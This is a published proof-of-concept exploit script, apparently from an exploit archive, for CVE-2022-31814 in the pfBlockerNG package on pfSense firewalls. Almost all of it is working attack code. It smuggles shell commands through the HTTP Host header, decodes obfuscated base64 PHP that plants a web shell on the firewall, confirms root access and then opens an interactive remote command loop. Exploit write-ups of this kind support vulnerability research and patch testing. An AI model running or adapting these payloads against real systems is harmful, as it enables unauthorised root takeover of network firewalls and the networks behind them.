# Exploit Title: pfBlockerNG 2.1.4_26 - Remote Code Execution (RCE)
# Date: 5th of September 2022
# Exploit Author: Splint3r7, Hassan Khan Yusufzai
# Vendor Homepage: https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html
# Software Link: https://github.com/pfsense/FreeBSD-ports/pull/1169
# Version: 2.1.4_26
# Tested on: pfSense 2.6.0
# CVE : CVE-2022-31814
# Original Advisory: https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/
 
#!/usr/bin/env python3

import argparse
import requests
import time
import sys
import urllib.parse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def parse_arguments():
    parser = argparse.ArgumentParser(description="pfBlockerNG <= 2.1.4_26 Unauth RCE")
    parser.add_argument('--url', required=True, help="Full URL and port e.g.: https://10.10.10.10:443/")
    return parser.parse_args()

def check_endpoint(TARGET_URL):
    response = requests.get(f'{TARGET_URL}/pfblockerng/www/index.php', verify=False)
    if response.status_code == 200:
        print("[+] pfBlockerNG is installed")
    else:
        print("[-] pfBlockerNG not installed")
        sys.exit()

def upload_shell(TARGET_URL, SHELL_NAME):
    payloads = [
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python3.8 -m base64 -d | php; '"},
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python3 -m base64 -d | php; '"},
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python2 -m base64 -d | php; '"},
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python -m base64 -d | php; '"},
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBlY2hvKHBhc3N0aHJ1KCAkX0dFVFsiYyJdKSk7Pz4nO2Z3cml0ZSgkYSwkdCk7ZmNsb3NlKCAkYSk7Pz4='|python -m base64 -d | php; '"},
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBlY2hvKHBhc3N0aHJ1KCAkX0dFVFsiYyJdKSk7Pz4nO2Z3cml0ZSgkYSwkdCk7ZmNsb3NlKCAkYSk7Pz4='|python3 -m base64 -d | php; '"},
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBlY2hvKHBhc3N0aHJ1KCAkX0dFVFsiYyJdKSk7Pz4nO2Z3cml0ZSgkYSwkdCk7ZmNsb3NlKCAkYSk7Pz4='|python2 -m base64 -d | php; '"},
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBlY2hvKHBhc3N0aHJ1KCAkX0dFVFsiYyJdKSk7Pz4nO2Z3cml0ZSgkYSwkdCk7ZmNsb3NlKCAkYSk7Pz4='|python3.8 -m base64 -d | php; '"}
    ]

    print("[/] Uploading shell...")
    for payload in payloads:
        print(f"[+] Testing Payload: {payload}")
        response = requests.get(f'{TARGET_URL}/pfblockerng/www/index.php', headers=payload, verify=False)
        if response.status_code == 400:
            print("[/] Uploading shell with a new payload...")
            response = requests.get(f'{TARGET_URL}/pfblockerng/www/index.php', headers=payload, verify=False)
            if response.status_code != 400:
                break

    time.sleep(2)
    response = requests.get(f'{TARGET_URL}/system_advanced_control.php?c=id', verify=False)
    if 'uid=0(root) gid=0(wheel)' in str(response.content, 'utf-8'):
        print("[+] Upload succeeded")
    else:
        print(f"[-] Error uploading shell. Possibly patched: {response.content}")
        sys.exit()

def interactive_shell(TARGET_URL, SHELL_NAME):
    while True:
        try:
            cmd = input("# ")
            response = requests.get(f'{TARGET_URL}/system_advanced_control.php?c={urllib.parse.quote(cmd, safe="")}', verify=False)
            print(response.text)
        except KeyboardInterrupt:
            delete_shell(TARGET_URL, SHELL_NAME)
            break

def delete_shell(TARGET_URL, SHELL_NAME):
    del_cmd = "rm /usr/local/www/system_advanced_control.php"
    requests.get(f'{TARGET_URL}/system_advanced_control.php?c={urllib.parse.quote(del_cmd, safe="")}', verify=False)
    print("[+] Shell deleted")

if __name__ == '__main__':
    
    args = parse_arguments()
    TARGET_URL = args.url
    SHELL_NAME = "system_advanced_control.php"

    check_endpoint(TARGET_URL)
    upload_shell(TARGET_URL, SHELL_NAME)
    interactive_shell(TARGET_URL, SHELL_NAME)
